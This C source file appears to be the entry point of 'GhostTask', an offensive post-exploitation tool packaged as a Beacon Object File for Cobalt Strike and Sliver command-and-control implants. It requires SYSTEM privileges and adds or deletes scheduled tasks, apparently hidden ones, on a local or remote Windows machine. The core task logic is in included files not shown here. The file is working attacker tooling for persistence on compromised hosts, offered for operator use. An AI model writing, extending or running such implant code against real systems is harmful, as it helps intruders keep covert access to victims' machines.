#include <windows.h>
#include <stdio.h>
#define DYNAMIC_LIB_COUNT 2
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "ghost_task.c"

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length)
{
    datap parser = {0};
    Arguments arguments = {0};
    BOOL success = FALSE;

    if (!bofstart())
    {
        return;
    }

    BeaconDataParse(&parser, Buffer, Length);

    if (!ParseArguments(&parser, &arguments))
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid arguments");
        goto go_end;
    }
    if (arguments.computerName == NULL)
    {
        if (!CheckSystem())
        {
            BeaconPrintf(CALLBACK_ERROR, "You have to run it as SYSTEM.");
            goto go_end;
        }
    }
    if (arguments.taskOperation == TaskAddOperation)
        success = AddScheduleTask(arguments.computerName, arguments.taskName, arguments.program, arguments.argument, arguments.userName, arguments.scheduleType, arguments.hour, arguments.minute, arguments.second, arguments.dayBitmap);
    else if (arguments.taskOperation == TaskDeleteOperation)
        success = DeleteScheduleTask(arguments.computerName, arguments.taskName);

    if (success)
        internal_printf("\nRUN Ghost Tasks SUCCESS.\n");

go_end:
    printoutput(TRUE);
    bofstop();
};

// Keep the CNA-facing `go` entrypoint's variable-arity ABI intact and expose a
// deterministic fixed-layout entrypoint for Sliver extension manifests.
VOID sliver(
    IN PCHAR Buffer,
    IN ULONG Length)
{
    Arguments arguments = {0};
    BOOL success = FALSE;

    if (!bofstart())
    {
        return;
    }

    datap parser = {0};
    if (!GhostTaskInitSliverParser(&parser, Buffer, Length))
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid GhostTask argument envelope.");
        goto sliver_end;
    }

    if (!ParseSliverArguments(&parser, &arguments))
    {
        goto sliver_end;
    }
    if (arguments.computerName == NULL && !CheckSystem())
    {
        BeaconPrintf(CALLBACK_ERROR, "You have to run it as SYSTEM.");
        goto sliver_end;
    }

    if (arguments.taskOperation == TaskAddOperation)
        success = AddScheduleTask(arguments.computerName, arguments.taskName, arguments.program, arguments.argument, arguments.userName, arguments.scheduleType, arguments.hour, arguments.minute, arguments.second, arguments.dayBitmap);
    else
        success = DeleteScheduleTask(arguments.computerName, arguments.taskName);

    if (success)
        internal_printf("\nRUN Ghost Tasks SUCCESS.\n");

sliver_end:
    printoutput(TRUE);
    bofstop();
};

/*
 * Reflektor selects custom entrypoints by their exact COFF symbol name, while
 * the legacy x86 COFFLoader prepends the platform underscore. Keep `_sliver`
 * for that fallback and expose an exact `sliver` alias for built-in execution.
 */
#if defined(__i386__)
VOID sliver_reflektor_entry(IN PCHAR Buffer, IN ULONG Length) __asm__("sliver");
VOID sliver_reflektor_entry(IN PCHAR Buffer, IN ULONG Length)
{
    sliver(Buffer, Length);
}
#endif
#else
int main(int argc, char **argv)
{
    Arguments arguments;
    BOOL success = FALSE;
    if (argc == 2 && (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0))
    {
        printHelp();
        return 0;
    }
    if (!ParseArguments(argv, argc, &arguments))
        return 0;
    if (arguments.computerName == NULL)
    {
        if (!CheckSystem())
        {
            printf("[-] You have to run it as SYSTEM.\n");
            return 0;
        }
    }
    if (arguments.taskOperation == TaskAddOperation)
        success = AddScheduleTask(arguments.computerName, arguments.taskName, arguments.program, arguments.argument, arguments.userName, arguments.scheduleType, arguments.hour, arguments.minute, arguments.second, arguments.dayBitmap);
    else if (arguments.taskOperation == TaskDeleteOperation)
        success = DeleteScheduleTask(arguments.computerName, arguments.taskName);
    return success ? 0 : 1;
}
#endif
